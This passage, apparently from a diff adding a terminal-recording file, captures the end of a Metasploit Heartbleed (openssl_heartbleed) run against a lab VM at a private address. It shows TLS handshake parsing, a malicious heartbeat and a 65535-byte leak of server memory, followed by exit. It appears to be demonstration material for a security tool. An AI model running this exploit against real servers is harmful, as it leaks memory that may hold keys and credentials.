+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - \tVersion: 0x0301\r\n"
+    ],
+    [
+      0.000552,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - \tLength:  614\r\n"
+    ],
+    [
+      0.000455,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - \tHandshake #1:\r\n"
+    ],
+    [
+      0.000565,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - \t\tLength: 610\r\n"
+    ],
+    [
+      0.000492,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - \t\tType:   Certificate Data (11)\r\n"
+    ],
+    [
+      0.000461,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - \t\tCertificates length: 607\r\n"
+    ],
+    [
+      0.000507,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - \t\tData length: 610\r\n"
+    ],
+    [
+      0.000388,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - \t\tCertificate #1:\r\n"
+    ],
+    [
+      0.00047,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - \t\t\tCertificate #1: Length: 604\r\n"
+    ],
+    [
+      0.000614,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - \t\t\tCertificate #1: #<OpenSSL::X509::Certificate: subject=#<OpenSSL::X509::Name:0x00562123feaf48>, issuer=#<OpenSSL::X509::Name:0x00562123feaf70>, serial=#<OpenSSL::BN:0x00562123feb088>, not_before=2017-06-05 16:54:53 UTC, not_after=2018-06-05 16:54:53 UTC>\r\n"
+    ],
+    [
+      0.000531,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - SSL record #3:\r\n"
+    ],
+    [
+      0.000443,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - \tType:    22\r\n"
+    ],
+    [
+      0.000678,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - \tVersion: 0x0301\r\n"
+    ],
+    [
+      0.002701,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - \tLength:  4\r\n"
+    ],
+    [
+      0.000465,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - \tHandshake #1:\r\n"
+    ],
+    [
+      0.00043,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - \t\tLength: 0\r\n"
+    ],
+    [
+      0.000675,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - \t\tType:   Server Hello Done (14)\r\n"
+    ],
+    [
+      0.00048,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - Sending Heartbeat...\r\n"
+    ],
+    [
+      0.004377,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - Heartbeat response, 65535 bytes\r\n"
+    ],
+    [
+      3.7e-05,
+      "\u001b[1m\u001b[32m[+]\u001b[0m 172.28.128.6:4443     - Heartbeat response with leak\r\n"
+    ],
+    [
+      0.017901,
+      "\u001b[1m\u001b[34m[*]\u001b[0m 172.28.128.6:4443     - Printable info leaked:"
+    ],
+    [
+      0.006112,
+      "\r\n"
+    ],
+    [
+      6.9e-05,
+      "......Y4..m6......%....)....C...?....=..f.....\".!.9.8.........5.............................3.2.....E.D...../...A...........................................=...<.......A.....F.......................#..... .............................................F.9.1...d.../.B... .(.-.....E.........+...!.'...........S...............+...g.............b.....H.....A...&...........B...................}...............$.........G.%.....g...........`.....{.*...~.e...y.M.)...t.Q.....s.r.q.i.p.?.m.P.l...@.=.k.j.i.....h.;.....f.e...d.c.......6._.].\\.....Y.X.W.V.,.T.......\".N.w.c.K.I...E.D...C...@.8.?.>...S...2.:.7...6.....5.4...5.3.2.(.........-...U.*.R.)...&.0.\". .m.7.s...;.0........./.....................Z.H.....P...............f.x.....V.....Z.....O...w...Q.1.....X.y...l.....z.Y.}...!.O.J.h.9.a.3...]...L.J...................................................................................................G.BZ....(...veewee_version..............[..z.... ...bash_logout............{............................(...vbox_version........"
+    ],
+    [
+      1.2e-05,
+      ".....................................7..................................................................................................................................... repeated 15059 times .....................................................................................................................................@..................................................................................................................................... repeated 16122 times .....................................................................................................................................@..................................................................................................................................... repeated 1093 times .....................................................................................................................................Y4..m6......%....)....C...?....=..f.....\".!.9.8.........5"
+    ],
+    [
+      3.4e-05,
+      ".............................3.2.....E.D...../...A...........................................=...<.......A.....F.......................#..... .............................................F.9.1...d.../.B... .(.-.....E.........+...!.'...........S...............+...g.............b.....H.....A...&...........B...................}...............$.........G.%.....g...........`.....{.*...~.e...y.M.)...t.Q.....s.r.q.i.p.?.m.P.l...@.=.k.j.i.....h.;.....f.e...d.c.......6._.].\\.....Y.X.W.V.,.T.......\".N.w.c.K.I...E.D...C...@.8.?.>...S...2.:.7...6.....5.4...5.3.2.(.........-...U.*.R.)...&.0.\". .m.7.s...;.0........./.....................Z.H.....P...............f.x.....V.....Z.....O...w...Q.1.....X.y...l.....z.Y.}...!.O.J.h.9.a.3...]...L.J...................................................................................................G.BZ....(...veewee_version..............[..z.... ...bash_logout............{............................(...vbox_version.............................................7........................."
+    ],
+    [
+      1.7e-05,
+      "............................................................................................................ repeated 13707 times .....................................................................................................................................@..................................................................................................................................... repeated 16103 times ....................................................................................................................................."
+    ],
+    [
+      2.7e-05,
+      "\r\n"
+    ],
+    [
+      0.000941,
+      "\u001b[1m\u001b[34m[*]\u001b[0m Scanned 1 of 1 hosts (100% complete)\r\n"
+    ],
+    [
+      0.000564,
+      "\u001b[1m\u001b[34m[*]\u001b[0m Auxiliary module execution completed\r\n"
+    ],
+    [
+      0.062272,
+      "\u001b[4mmsf\u001b[0m auxiliary(\u001b[1m\u001b[31mopenssl_heartbleed\u001b[0m) \u001b[0m> "
+    ],
+    [
+      2.0,
+      "e"
+    ],
+    [
+      0.20711,
+      "x"
+    ],
+    [
+      0.158239,
+      "i"
+    ],
+    [
+      0.114873,
+      "t"
+    ],
+    [
+      0.525739,
+      "\r\r\n"
+    ],
+    [
+      0.037124,
+      "\u001b[0m"
+    ],
+    [
+      0.2673,
+      "\u001b]0;root@kali: ~\u0007\u001b[01;31mroot@kali\u001b[00m:\u001b[01;34m~\u001b[00m# "
+    ],
+    [
+      1.668309,
+      "exit"
+    ],
+    [
+      0.000146,
+      "\r\n"
+    ]
+  ],
+  "height": 31
+}
